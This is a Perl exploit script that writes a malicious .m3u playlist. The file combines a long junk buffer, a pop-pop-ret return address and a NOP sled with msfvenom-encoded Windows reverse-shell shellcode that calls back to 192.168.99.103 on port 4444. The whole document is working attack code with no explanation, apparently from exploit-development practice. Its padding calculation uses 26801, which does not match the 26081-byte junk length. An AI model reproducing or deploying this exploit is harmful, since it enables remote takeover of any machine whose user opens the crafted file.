my $file= "test1.m3u";
my $junk="\x41" x 26081;
my $eip= pack('V', 0x0199bb3e); # pop pop ret
my $prependesp = "XX";
my $shellcode = "\x90" x 8;
my $padding = "\x90" x 30;
$shellcode = $shellcode . $padding;
# msfvenom --payload windows/shell_reverse_tcp LHOST=192.168.99.103 LPORT=4444 -e x86/alpha_mixed -f perl
# Payload size: 710 bytes
$shellcode = $shellcode .
"\x89\xe2\xdb\xc5\xd9\x72\xf4\x5d\x55\x59\x49\x49\x49\x49" .
"\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51" .
"\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32" .
"\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41" .
"\x42\x75\x4a\x49\x69\x6c\x5a\x48\x6e\x62\x47\x70\x67\x70" .
"\x73\x30\x55\x30\x4d\x59\x5a\x45\x30\x31\x4f\x30\x53\x54" .
"\x4e\x6b\x66\x30\x44\x70\x6c\x4b\x56\x32\x64\x4c\x4c\x4b" .
"\x66\x32\x72\x34\x6e\x6b\x62\x52\x37\x58\x56\x6f\x6c\x77" .
"\x42\x6a\x74\x66\x34\x71\x79\x6f\x4c\x6c\x75\x6c\x43\x51" .
"\x63\x4c\x36\x62\x34\x6c\x65\x70\x6a\x61\x6a\x6f\x36\x6d" .
"\x46\x61\x49\x57\x79\x72\x4a\x52\x51\x42\x42\x77\x6c\x4b" .
"\x71\x42\x42\x30\x6c\x4b\x52\x6a\x47\x4c\x4e\x6b\x70\x4c" .
"\x46\x71\x62\x58\x58\x63\x31\x58\x36\x61\x6a\x71\x73\x61" .
"\x6c\x4b\x66\x39\x47\x50\x75\x51\x39\x43\x4c\x4b\x70\x49" .
"\x36\x78\x68\x63\x67\x4a\x30\x49\x6c\x4b\x57\x44\x6e\x6b" .
"\x36\x61\x38\x56\x64\x71\x39\x6f\x6e\x4c\x6f\x31\x6a\x6f" .
"\x56\x6d\x46\x61\x6b\x77\x56\x58\x79\x70\x52\x55\x6c\x36" .
"\x34\x43\x51\x6d\x49\x68\x35\x6b\x63\x4d\x46\x44\x71\x65" .
"\x7a\x44\x62\x78\x6c\x4b\x43\x68\x37\x54\x73\x31\x69\x43" .
"\x50\x66\x4c\x4b\x64\x4c\x50\x4b\x6e\x6b\x63\x68\x45\x4c" .
"\x65\x51\x48\x53\x4e\x6b\x55\x54\x6c\x4b\x46\x61\x5a\x70" .
"\x6b\x39\x71\x54\x46\x44\x66\x44\x61\x4b\x33\x6b\x70\x61" .
"\x46\x39\x71\x4a\x66\x31\x59\x6f\x6d\x30\x73\x6f\x53\x6f" .
"\x62\x7a\x4c\x4b\x42\x32\x38\x6b\x6c\x4d\x31\x4d\x52\x48" .
"\x76\x53\x44\x72\x45\x50\x55\x50\x62\x48\x63\x47\x33\x43" .
"\x77\x42\x63\x6f\x72\x74\x73\x58\x32\x6c\x54\x37\x77\x56" .
"\x73\x37\x4b\x4f\x69\x45\x48\x38\x6e\x70\x37\x71\x73\x30" .
"\x53\x30\x31\x39\x6a\x64\x66\x34\x36\x30\x71\x78\x75\x79" .
"\x4b\x30\x30\x6b\x47\x70\x39\x6f\x7a\x75\x56\x30\x72\x70" .
"\x62\x70\x42\x70\x43\x70\x62\x70\x67\x30\x70\x50\x53\x58" .
"\x58\x6a\x44\x4f\x39\x4f\x6d\x30\x39\x6f\x59\x45\x7a\x37" .
"\x43\x5a\x34\x45\x50\x68\x79\x50\x69\x38\x35\x33\x35\x37" .
"\x31\x78\x33\x32\x63\x30\x62\x31\x63\x6c\x4d\x59\x4b\x56" .
"\x32\x4a\x76\x70\x46\x36\x42\x77\x72\x48\x4d\x49\x6d\x75" .
"\x44\x34\x31\x71\x6b\x4f\x38\x55\x6e\x65\x4b\x70\x42\x54" .
"\x66\x6c\x59\x6f\x70\x4e\x77\x78\x71\x65\x78\x6c\x45\x38" .
"\x4c\x30\x4e\x55\x39\x32\x62\x76\x79\x6f\x4b\x65\x75\x38" .
"\x42\x43\x42\x4d\x65\x34\x47\x70\x6e\x69\x68\x63\x33\x67" .
"\x62\x77\x52\x77\x70\x31\x4a\x56\x70\x6a\x67\x62\x56\x39" .
"\x36\x36\x6a\x42\x79\x6d\x51\x76\x4b\x77\x67\x34\x37\x54" .
"\x75\x6c\x47\x71\x55\x51\x4c\x4d\x51\x54\x47\x54\x32\x30" .
"\x69\x56\x67\x70\x37\x34\x46\x34\x76\x30\x62\x76\x73\x66" .
"\x76\x36\x77\x36\x32\x76\x52\x6e\x31\x46\x30\x56\x73\x63" .
"\x56\x36\x43\x58\x42\x59\x78\x4c\x77\x4f\x4b\x36\x6b\x4f" .
"\x48\x55\x4c\x49\x79\x70\x52\x6e\x70\x56\x77\x36\x49\x6f" .
"\x70\x30\x35\x38\x76\x68\x4d\x57\x47\x6d\x71\x70\x49\x6f" .
"\x7a\x75\x4d\x6b\x78\x70\x6c\x75\x4c\x62\x36\x36\x61\x78" .
"\x59\x36\x6f\x65\x4d\x6d\x6d\x4d\x79\x6f\x7a\x75\x57\x4c" .
"\x67\x76\x53\x4c\x66\x6a\x6b\x30\x39\x6b\x49\x70\x32\x55" .
"\x55\x55\x6d\x6b\x70\x47\x64\x53\x72\x52\x70\x6f\x31\x7a" .
"\x57\x70\x70\x53\x59\x6f\x4b\x65\x41\x41";

open($FILE, ">$file");
my $data = "$junk.$eip.$prependesp.$shellcode" . "\x41" x (30000 - 26801 - 4 - 2 - 8 - 4 - 30 - 710);
print $FILE $data;
close($FILE);
print "m3u File Created successfully\n";
